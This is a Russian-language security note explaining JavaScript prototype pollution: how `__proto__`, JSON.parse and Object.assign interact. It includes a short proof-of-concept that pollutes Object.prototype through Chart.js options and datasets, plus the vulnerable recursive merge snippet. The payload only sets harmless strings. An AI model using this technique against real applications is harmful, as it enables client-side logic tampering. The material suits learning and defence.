# Prototype Pollution Attack

По другому еще Prototype Poisoning называют

## Prototype in a nutshell

Что такое proto — кто-то решил, что здорово будет иметь специальное поле для описания полей и методов объекта. Сейчас это значится как deprecated, но до сих пор полностью поддерживается. Как это работает:

```javascript
> const a = { b: 5 }
> a.b
5
> a.__proto__ = { c: 6 }
> a.c
6
> a
{ b: 5 }
```

Как мы видим, объект `a` не имеет свойство `c`, но его prototype имеет. Если валидатор проверяет только свойства объекта `a`, то можно обойти этот валидатор.

Другой важной частью этой истории является то, как `JSON.parse()` — утилита, предоставляемая языком для преобразования текста в формате JSON в объекты  — обрабатывает это волшебное имя свойства `__proto__`.

```javascript
> const text = '{ "b": 5, "__proto__": { "c": 6 } }'
> const a = JSON.parse(text)
> a
{ b: 5, __proto__: { c: 6 } }
```

В данном случае, поле `__proto__` не ссылка на prototype, а такое же поле как и `b`. Сам по себе объект созданный с помощью `JSON.parse` совершенно безопасен. У него нет собственного прототипа. У него есть, казалось бы, безобидное свойство, которое просто совпадает со встроенным магическим именем JavaScript.

Однако другие методы могут обработать это неожиданным способом:

```javascript
> const x = Object.assign({}, a)
> x
{ b: 5}
> x.c
6
```

Метод `Object.assign` используется для создания копии объекта, помещая все свойства объекта `a` в объект `{}`. И прототип улетает в `x`!

## Tools

Какой-то инструмент: [https://github.com/msrkp/PPScan/](https://github.com/msrkp/PPScan/)

## Статьи

Сборник вулнов: [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

Пример и mitigation для этой атаки: [https://www.whitesourcesoftware.com/resources/blog/prototype-pollution-vulnerabilities/](https://www.whitesourcesoftware.com/resources/blog/prototype-pollution-vulnerabilities/)

## Пример

пусть есть js-файл

Пример внедрение в `__proto__` своего кода

```markup
<canvas id="canvas"></canvas>
<script src="node_modules/chart.js/dist/Chart.bundle.js"></script>
<script>
    var ctx = document.getElementById('canvas').getContext('2d');
    var chart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: ['January', 'February', 'March', 'April', 'May'],
            datasets: [{
                label: 'My First dataset',
                backgroundColor: 'rgb(255, 99, 132)',
                borderColor: 'rgb(255, 99, 132)',
                data: [0, 10, 5, 2, 20]
            },
            JSON.parse(`{"__proto__": {"abc": "Injected value through dataset"}}`)
            ]
        },
        options: JSON.parse(`{"__proto__": {"def": "Injected value through options"}}`)
    });
    console.log({}.abc); // Print "Injected value through dataset"
    console.log({}.def); // Print "Injected value through options"
</script>
```

А все из-за того, что где-то в коде есть такой код (или подобный)

```javascript
if (isObject(tval) && isObject(sval)) {
    // eslint-disable-next-line no-use-before-define
    merge(tval, sval, options);
}
```

Ike Murami, \[3 дек. 2020 г., 14:40:07]: Мне сейчас рассказали, что это только логика, потому как функцию не сможешь замерджить через proto (так как нет способа десер через js сделать и отправить функцию как таковую)

соотв трудность in the wild: найти чейн, в котором замердженные объекты обрабатываются и влияют нужным образом на логику

\*на клиенте
